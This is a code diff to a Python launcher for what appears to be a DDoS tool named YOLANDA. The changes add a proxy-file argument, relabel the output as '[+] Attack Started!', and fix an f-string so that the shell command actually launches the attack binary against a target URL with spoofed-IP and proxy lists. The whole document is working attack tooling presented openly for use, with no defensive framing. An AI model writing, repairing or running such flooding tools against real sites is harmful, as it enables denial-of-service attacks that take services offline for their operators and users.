@@ -8,14 +8,14 @@ requests = __import__("httpx")
 
 
 class YOLANDA:
-	def __init__(self, target, time, spoofIP, thread):
+	def __init__(self, target, time, thread, spoofIP, proxyfile):
 		super().__init__()
 
 		self._target = target
 		self._time = time
-		self._spoofIP = spoofIP
 		self._thread = thread
-		self._fproxy = "proxy.txt"
+		self._spoofIP = spoofIP
+		self._fproxy = proxyfile
 
 	def getproxy(self) -> None:
 		print("[+] Checking Proxy Providers...")
@@ -37,19 +37,19 @@ class YOLANDA:
 		proxy.close()
 
 	def start(self) -> None:
-		print("[+] Executing...")
+		print("[+] Attack Started!")
 		run(["chmod 777 YOLANDA"], shell=True)
-		run(["./YOLANDA {self._target} {self._time} {self._thread} {self._spoofIP} {self._fproxy}"], shell=True)
+		run([f"./YOLANDA {self._target} {self._time} {self._thread} {self._spoofIP} {self._fproxy}"], shell=True)
 
 
 if __name__ == "__main__":
 	try:
-		if int(argv[4]) > 3 or int(argv[4]) < 1:
+		if int(argv[3]) > 3 or int(argv[3]) < 1:
 			exit("[-] MaxThread: 3")
 		else:
-			yolanda = YOLANDA(target=str(argv[1]), time=int(argv[2]), spoofIP=str(argv[3]), thread=int(argv[4]))
+			yolanda = YOLANDA(target=str(argv[1]), time=int(argv[2]), thread=int(argv[3]), spoofIP=str(argv[4]), proxyfile=str(argv[5]))
 			yolanda.getproxy()
 			yolanda.start()
 	except Exception:
 		print("\033cUsage:\n python3 start.py [TagetURL] [Time] [Thread] [spoofIP] [Proxyfile]")
-		exit("Example:\n python3 start.py https://website.com 1200 1 spoofIP.txt) proxy.txt")
+		exit("Example:\n python3 start.py https://website.com 1200 1 spoofIP.txt proxy.txt")
